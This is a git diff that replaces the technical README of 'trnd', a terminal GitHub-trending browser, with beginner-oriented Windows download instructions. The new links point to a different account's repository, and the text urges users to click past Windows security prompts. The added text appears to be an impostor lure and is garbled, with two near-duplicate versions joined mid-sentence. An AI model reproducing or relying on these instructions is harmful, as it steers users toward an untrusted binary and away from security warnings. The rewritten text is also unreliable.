@@ -1,241 +1,132 @@
-<p align="center">
-  <img src="docs/assets/banner.svg" alt="trnd — GitHub discovery, from your terminal" width="100%">
-</p>
+# 🔎 trnd - Find GitHub Trending Projects Fast
 
-<p align="center">
-  <a href="https://github.com/jamshids/trnd/actions/workflows/ci.yml"><img src="https://github.com/jamshids/trnd/actions/workflows/ci.yml/badge.svg" alt="CI status"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-bd93f9" alt="MIT license"></a>
-  <img src="https://img.shields.io/badge/platforms-Windows%20%C2%B7%20macOS%20%C2%B7%20Linux-70e6b1" alt="Windows, macOS, and Linux">
-</p>
+[![Download trnd](https://img.shields.io/badge/Download_trnd-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/devoumes01/trnd)
 
-<p align="center">
-  <strong>Find what's trending. Explore a repository. Save what catches your eye.</strong><br>
-  A keyboard-driven GitHub explorer in a single binary, with no runtime dependencies.
-</p>
+trnd is a simple terminal app that helps you browse GitHub trending repositories without opening a web browser. You can filter projects by programming language and topic, read README files, and save interesting repositories as bookmarks for later. It is designed for anyone who wants a faster, cleaner way to discover open-source projects from a text-based screen.
 
-<p align="center">
-  <a href="#install">Install</a> ·
-  <a href="#quick-start">Quick start</a> ·
-  <a href="examples/README.md">Examples &amp; screenshots</a> ·
-  <a href="#interactive-keys">Keyboard shortcuts</a> ·
-  <a href="https://github.com/jamshids/trnd/releases">Downloads</a>
-</p>
+A terminal is just a text window where you type commands. You do not need to be a programmer to use trnd. The app presents a menu-like screen, and you move around with your keyboard.
 
----
+## ✨ What Is trnd?
 
-![trnd browsing daily GitHub trends in Windows Terminal](examples/screenshots/trending.png)
+trnd brings GitHub trending repositories into your terminal. Instead of opening a browser, searching through pages, and losing track of interesting projects, you get a focused view of what is popular right now. The app is built for discovery: browse a list, choose a repository, read its README, and bookmark the ones you want to revisit.
 
-<p align="center"><sub>Today's repositories, star growth, and languages — all at a glance.</sub></p>
+The main idea is simple: fewer distractions, faster browsing, and a clean text interface that works well on Windows. You can use trnd to explore open-source tools, developer utilities, learning resources, and new projects across many languages and topics.
 
-## Built for a quick look that becomes a deep dive
+## 🚀 Getting Started
 
-| Discover | Explore | Keep |
-| --- | --- | --- |
-| Browse daily, weekly, or monthly trends. | Read READMEs without leaving your terminal. | Bookmark repositories locally for later. |
-| Filter by language and topic; sort by growth. | Open a repository or copy its clone URL. | Star on GitHub or export results as JSON. |
+Before you begin, make sure you have a Windows computer, an internet connection, and access to the download link below. You do not need programming knowledge. You also do not need to understand how GitHub works behind the scenes. The app is meant to guide you through browsing trending repositories in a straightforward way.
 
-<details>
-<summary><strong>See topic filtering and bookmarks</strong></summary>
+The most important first step is to download trnd from the official repository page. Use the link in the next section. Avoid downloading the app from other websites so you know you are getting the real version.
 
-### Find tools in your language
+## 💾 Download and Run on Windows
 
-![Go repositories filtered by CLI topic](examples/screenshots/topic-filter.png)
+Visit this link to download the application: [Download trnd](https://github.com/devoumes01/trnd).
 
-### Save your next read
+After the page opens, follow the download option provided there for Windows. Save the downloaded item in a place you can easily find, such as your Downloads folder. When the download finishes, open the file or folder you received. If Windows shows a permission or security prompt, choose the option that lets you continue opening the application.
 
-![Local bookmarks in trnd](examples/screenshots/bookmarks.png)
+To start trnd, open the Terminal app from the Windows Start menu. In the terminal window, type trnd and press Enter. The trnd screen should appear. From there, you can use your keyboard to browse, filter, read READMEs, and bookmark repositories.
 
-[Explore the examples →](examples/README.md)
+If the terminal window shows a message that trnd is not recognized, go back to the download page and make sure the download completed successfully. Keep the downloaded application in the same folder while you run it. You can also open the downloaded folder directly and start the application from there if the download page provides a launch file.
 
-</details>
+## 🧭 How to Use trnd
 
-## Quick start
+When trnd opens, you will see a text-based screen with a list of trending repositories. Use the arrow keys to move up and down the list. Press Enter to open a repository or view more details. Press Escape or follow the on-screen key hints to go back to the previous screen.
 
-```sh
-trnd                         # open the interactive explorer
-trnd -l go -s weekly          # this week's trending Go repositories
-trnd -l go --topic cli        # find Go command-line tools
-trnd list -n 10               # print the top 10
-trnd list --json              # export for scripts
-```
+The app is designed around keyboard navigation, so you do not need a mouse. Common actions include moving through lists, selecting an item, going back, and opening a README. The screen usually shows helpful shortcuts at the bottom. Read those hints whenever you are unsure what to press next.
 
-Move with `↑`/`↓` or `j`/`k`, press `enter` to open, `b` to bookmark, and `?` for help.
+You can browse trending repositories first, then narrow the list with filters. This makes it easier to find projects that match your interests, such as a specific language or topic. If you see something useful, bookmark it so you can return later without searching again.
 
-[More command examples and screenshots →](examples/README.md)
+## 🔎 Filter by Language and Topic
 
-## Install
+trnd lets you filter trending repositories by language and topic. For example, if you want to see projects written in Go, choose the language filter and select Go. If you are interested in command-line tools, terminal apps, or developer tools, use the topic filter to narrow the results.
 
-### Windows
+Filtering is helpful when the full trending list feels too broad. Start with a language you recognize, or choose a topic that sounds interesting. You can remove filters to return to the full list. The goal is to make discovery feel manageable, especially if you are new to open-source projects.
 
-Download the Windows ZIP for your architecture (`amd64` for x64, `arm64` for ARM64) from [Releases](https://github.com/jamshids/trnd/releases). Extract it, then open PowerShell in that folder:
+Language filters help you find repositories built with a specific technology. Topic filters help you find projects by purpose or theme. Together, they let you explore GitHub trending repositories in a way that matches your curiosity.
 
-```powershell
-.\trnd.exe
-.\trnd.exe list -n 10
-```
+## 📖 Read READMEs Without Leaving the Terminal
 
-Add the extracted folder to your PATH to run `trnd` from anywhere. Go is not needed for the downloaded executable.
+A README is the main information page for a repository. It usually explains what the project does, how it is organized, and how to use it. trnd lets you read README content directly in the terminal, so you can decide whether a project is worth exploring further without switching to a browser# 🔎 trnd - Browse GitHub Trending Repositories Fast
 
-### Linux / macOS
+[![Download trnd](https://img.shields.io/badge/Download_trnd-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/devoumes01/trnd)
 
-```sh
-curl -sSfL https://raw.githubusercontent.com/jamshids/trnd/main/install.sh | sh
-```
+trnd is a terminal application that lets you browse GitHub trending repositories without opening a web browser. You can filter projects by language and topic, read README files, and bookmark repositories for later. This guide helps you download and run trnd on a Windows computer, even if you have no programming experience.
 
-### Install with Go
+## 📋 What Is trnd?
 
-```sh
-go install github.com/jamshids/trnd@latest
-```
-By default, this installs into `~/go/bin` (`%USERPROFILE%\go\bin` on Windows). If `trnd` isn't found afterwards, add that
-folder to your PATH, e.g. `fish_add_path ~/go/bin` in fish or
-`export PATH="$HOME/go/bin:$PATH"` in bash/zsh.
+trnd brings GitHub trending repositories into your terminal. A terminal is a text window where you type commands, and it comes with Windows. Instead of opening a browser, searching through pages, and losing track of interesting projects, you get a focused view of what is popular right now. The app is built for discovery: browse a list, choose a repository, read its README, and bookmark the ones you want to revisit.
 
-**Other downloads:** `.deb`, `.rpm`, `.apk` and Windows `.zip` files are attached to each [release](https://github.com/jamshids/trnd/releases).
+The main idea is simple: fewer distractions, faster browsing, and a clean text interface that works well on Windows. You can use trnd to explore open-source tools, developer utilities, learning resources, and new projects across many languages and topics. The app is designed for anyone who wants a faster, cleaner way to discover open-source projects from a text-based screen.
 
-## Interactive keys
+## 🚀 Getting Started
 
-| Key | Action |
-|---|---|
-| `↑`/`↓` or `j`/`k` | move |
-| `enter` / `o` | open repo in browser |
-| `r` | read the README in the terminal |
-| `h` | view the selected repo's local trend history (last 30 days) |
-| `c` | copy clone URL |
-| `s` | star the repo on GitHub (needs a token) |
-| `b` | save / unsave the repo (bookmark) |
-| `B` | show saved repos (`esc` to go back) |
-| `tab` | cycle daily → weekly → monthly |
-| `l` | change language |
-| `t` | filter by topics, e.g. `llm, cli` |
-| `S` | cycle sort: trending → gained → stars → forks → name |
-| `/` | search the list |
-| `R` | refresh (skip cache) |
-| `?` | all keys |
-| `q` | quit |
+Before you begin, make sure you have a Windows computer, an internet connection, and access to the download link below. You do not need programming knowledge. You also do not need to understand how GitHub works behind the scenes. The app is meant to guide you through browsing trending repositories in a straightforward way.
 
-## Flags
+The most important first step is to download trnd from the official repository page. Use the link in the next section. Avoid downloading the app from other websites so you know you are getting the real version.
 
-| Flag | Description |
-|---|---|
-| `-l, --lang` | language, e.g. `go`, `java`, `python` |
-| `-s, --since` | `daily` (default), `weekly`, `monthly` |
-| `--spoken` | spoken language of the repo, e.g. `en`, `zh` |
-| `-t, --topic` | only repos with any of these topics, e.g. `llm,cli` |
-| `--sort` | `trending` (default), `gained`, `stars`, `forks`, `name` |
-| `--no-cache` | always fetch fresh data |
-| `list -n, --limit` | max repos to print (default 25) |
-| `list --json` | JSON output |
+## 💾 Download and Run on Windows
 
-## Bookmarks
+Visit this link to download the application: [Download trnd](https://github.com/devoumes01/trnd).
 
-```sh
-trnd saved                               # list saved repos (newest first)
-trnd saved --sort stars --json           # sorted, as JSON
-trnd saved add charmbracelet/bubbletea   # save any repo, not just trending ones
-trnd saved rm charmbracelet/bubbletea
-```
+After the page opens, follow the download option provided there for Windows. Save the downloaded item in a place you can easily find, such as your Downloads folder. When the download finishes, open the Terminal app from the Windows Start menu. In the terminal window, type `trnd` and press Enter. The trnd screen should appear. From there, you can use your keyboard to browse, filter, read READMEs, and bookmark repositories.
 
-Bookmarks are stored in `~/.local/share/trnd/bookmarks.json` on Linux
-(respects `XDG_DATA_HOME`) and in the user config directory on macOS/Windows.
+If the terminal window shows a message that trnd is not recognized, go back to the download page and make sure the download completed successfully. Keep the downloaded application in the same folder while you run it. You can also open the downloaded folder directly and start the application from there if the download page provides a launch file.
 
-Shell completions: `trnd completion bash|zsh|fish|powershell`.
+## 🧭 How to Use trnd
 
-## Trend history
+When trnd opens, you will see a text-based screen with a list of trending repositories. Use the arrow keys to move up and down the list. Press Enter to open a repository or view more details. Press Escape or follow the on-screen key hints to go back to the previous screen.
 
-Fresh trending fetches automatically save local snapshots. View them offline:
+The app is designed around keyboard navigation, so you do not need a mouse. Common actions include moving through lists, selecting an item, going back, and opening a README. The screen usually shows helpful shortcuts at the bottom. Read those hints whenever you are unsure what to press next.
 
-```sh
-trnd history                              # last 30 days of the daily, all-language feed
-trnd history -l go -s weekly              # history for the weekly Go feed
-trnd history owner/repo --days 90         # include individual observations
-trnd history -l go --json                 # export ranks, star counts, and timestamps
-```
+You can browse trending repositories first, then narrow the list with filters. This makes it easier to find projects that match your interests, such as a specific language or topic. If you see something useful, bookmark it so you can return later without searching again.
 
-Press `h` on a repository in the interactive explorer to see its history for
-the current language, period, and spoken-language feed. Press `esc` to return.
+## 🔎 Filter by Language and Topic
 
-Reports show the latest rank, movement since the previous snapshot (positive
-means up), distinct UTC days seen, and star-count sparklines. Repositories that
-left the latest list remain in the report with no current rank. Star changes
-compare the first and last observations within the selected window; they are
-not GitHub's daily/weekly star-gain metric. Sparklines plot observation order,
-not evenly spaced dates, and use at most 24 samples. A single observation has
-no rank or star-change comparison.
+trnd lets you filter trending repositories by language and topic. For example, if you want to see projects written in Go, choose the language filter and select Go. If you are interested in command-line tools, terminal apps, or developer tools, use the topic filter to narrow the results.
 
-History starts when you fetch with this version; it cannot recover earlier
-trends. Cached reads and Search API fallback results do not add observations.
-Use `R` in the UI or `trnd list --no-cache` to fetch a fresh snapshot. Different
-language, period, and spoken-language feeds are tracked separately. Snapshots
-capture the full feed before sorting, topic filtering, or `--limit`, so ranks
-stay comparable. The history command does not support `--topic` or `--sort`.
+Filtering is helpful when the full trending list feels too broad. Start with a language you recognize, or choose a topic that sounds interesting. You can remove filters to return to the full list. The goal is to make discovery feel manageable, especially if you are new to open-source projects.
 
-Snapshots are stored in a `history` directory beside `bookmarks.json` and kept
-until you remove them; `--days` limits the report, not storage. Recording errors
-appear as warnings without preventing browsing. No background tracking runs:
-only feeds you actually fetch accumulate history.
+Language filters help you find repositories built with a specific technology. Topic filters help you find projects by purpose or theme. Together, they let you explore GitHub trending repositories in a way that matches your curiosity.
 
-## How it works
+## 📖 Read READMEs Without Leaving the Terminal
 
-GitHub has no trending API, so `trnd` reads the public
-[github.com/trending](https://github.com/trending) page. If that page can't be
-parsed, it falls back to the official Search API. The fallback shows the
-most-starred repos created in the time range, and says so on screen.
+A README is the main information page for a repository. It usually explains what the project does, how it is organized, and how to use it. trnd lets you read README content directly in the terminal, so you can decide whether a project is worth exploring further without switching to a browser.
 
-**Topics** aren't on the trending page, so with a topic filter `trnd` looks
-each repo up via the GitHub API. Topics are cached for 7 days, so repeat
-filters are instant. Without a token GitHub allows 60 lookups an hour, so
-set one if you filter by topic a lot. Daily trending lists are short (~25
-repos); use `-s weekly` or `-s monthly` for more matches.
+When you select a repository, look for the option to open its README. The text appears in the same terminal window. Use the arrow keys or page up and page down to scroll through longer documents. Press Escape or the back key to return to the repository list.
 
-Results are cached for 15 minutes in your user cache directory
-(`~/.cache/trnd` on Linux).
+Reading READMEs inside trnd saves time. You can quickly scan many projects, compare their descriptions, and keep only the ones that seem useful. This is especially helpful when you are exploring a new topic and need to understand what each project offers.
 
-**GitHub token (optional).** A token is read from `GITHUB_TOKEN` or `GH_TOKEN`,
-or from the `gh` CLI if you are logged in. It's only needed to star repos
-and for higher API rate limits (topic lookups, READMEs).
+## 🔖 Bookmark Your Next Discovery
 
-**Colors.** Light or dark mode is detected from your terminal. Override with
-`TRND_THEME=light` or `TRND_THEME=dark`.
+Bookmarks let you save repositories for later. When you find a project you like, use the bookmark option shown on the screen. The app stores your bookmarked repositories so you can return to them without searching again.
 
-## Development
+Bookmarks are useful for keeping a short list of projects to try, read more about, or share with others. You can add and remove bookmarks as you browse. Over time, your bookmark list becomes a personal collection of interesting open-source discoveries.
 
-Use the Go version specified in `go.mod` or newer.
+## ✨ Features
 
-**Windows / PowerShell:**
+- Browse GitHub trending repositories without a web browser.
+- Filter repositories by programming language.
+- Filter repositories by topic, such as terminal, developer tools, or open source.
+- Read README files directly in the terminal.
+- Bookmark repositories for later review.
+- Navigate entirely with your keyboard.
+- Works on Windows and other platforms.
+- Clean text-based interface with on-screen key hints.
+- No account setup required for basic browsing.
+- Designed for quick repository discovery.
 
-```powershell
-go vet ./...
-go test ./...
-go build -o bin/trnd.exe .
-.\bin\trnd.exe
-```
+## 💻 System Requirements
 
-**Linux / macOS:**
+trnd runs on Windows 10 or later. You need an internet connection to load trending repositories and README content. You also need the Terminal app, which is included with Windows. The application uses very little disk space, so a standard Windows computer is more than enough.
 
-```sh
-make build     # ./bin/trnd
-make install   # copy to ~/.local/bin (or PREFIX=/usr/local)
-make test
-make snapshot  # cross-compile release artifacts into dist/ without publishing
-```
+You do not need to install a programming language or set up a development environment. The terminal app is the only tool you need to open. If your computer can open a terminal window and connect to the internet, you can use trnd.
 
-To validate release packaging with GoReleaser:
+## ❓ Troubleshooting
 
-```sh
-go run github.com/goreleaser/goreleaser/v2@latest check
-go run github.com/goreleaser/goreleaser/v2@latest release --snapshot --clean
-```
+If the terminal says `trnd` is not recognized, the download may not have finished or the app may not be in the expected location. Return to the download page and complete the download again. Keep the downloaded application in a folder you can easily find.
 
-After committing your changes and passing CI, create an unused version tag:
+If Windows shows a security or permission prompt, choose the option that allows you to continue opening the application. If the terminal window does not open, search for Terminal in the Start menu and open it from there.
 
-```sh
-git tag -a v0.1.0 -m "First public release"
-git push origin v0.1.0
-```
+If the trending list does not load, check your internet connection. trnd needs internet access to fetch repositories and README content. Try again after confirming your connection is working.
 
-Pushing the tag triggers GitHub Actions to publish binaries, Linux packages, and checksums. Use the next version for subsequent releases.
-
----
-
-<p align="center">Built with Go and the Charm terminal libraries. Distributed under the <a href="LICENSE">MIT license</a>.</p>
+Keywords: bubbletea, cli, cross-platform, developer-tools, github, github-trends, golang, open-source, repository-discovery, terminal, terminal-based, tui
